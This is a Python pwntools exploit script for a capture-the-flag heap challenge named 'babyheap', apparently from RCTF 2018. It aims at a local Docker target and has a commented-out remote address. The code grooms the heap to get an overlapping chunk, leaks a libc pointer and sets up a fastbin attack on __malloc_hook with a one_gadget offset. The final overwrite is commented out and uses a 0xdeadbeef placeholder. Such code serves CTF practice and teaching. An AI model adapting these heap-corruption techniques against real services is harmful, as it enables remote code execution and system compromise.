from pwn import *

#s = process('./babyheap')
# s = remote('babyheap.2018.teamrois.cn',3154)
s = remote("172.17.0.2", 1234)
context.log_level= "debug"
raw_input("go")

def alloc(size,data):
    s.sendlineafter('e: ','1')
    s.sendlineafter('e: ',str(size))
    s.sendafter('t: ',data)

def show(idx):
    s.sendlineafter('e: ','2')
    s.sendlineafter('x: ',str(idx))

def free(idx):
    s.sendlineafter('e: ','3')
    s.sendlineafter('x: ',str(idx))

# l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
alloc(0x30,'A' * 0x30) # 0
alloc(0xf0,'A' * 0xf0) # 1
alloc(0x70,'A' * 0x70) # 2
alloc(0xf0,'A' * 0xf0) # 3
alloc(0x30,'A' * 0x30) # 4

free(1)
free(2)
alloc(0x78,'B' * 0x60 + p64(0) + p64(0x110) + p64(0x180)) # 1

# chunk overlap
free(3)
alloc(0xf0,'A' * 0xf0) # 2

# libc leak
show(1)
s.recvuntil('content: ')
# libc = u64(s.recv(6) + "\x00" * 2) - l.symbols['__malloc_hook'] - 0x68
# log.info("libc : " + hex(libc))

free(2)
alloc(0x80, 'A' * 0x80) # 2
alloc(0x80, 'C' * 0x60 + p64(0) + p64(0x71) + p64(0) + p64(0)) # 3

free(1)
free(3)
# hook = libc + l.symbols['__malloc_hook'] - 0x23
# oneshot = libc + 0x4526a
alloc(0x80, 'C' * 0x60 + p64(0) + p64(0x70) + p64(0xdeadbeef) + p64(0))

# alloc(0x60,'A' * 0x60)
# alloc(0x60,'A' * 0x13 + p64(oneshot) + "\n")

s.interactive()
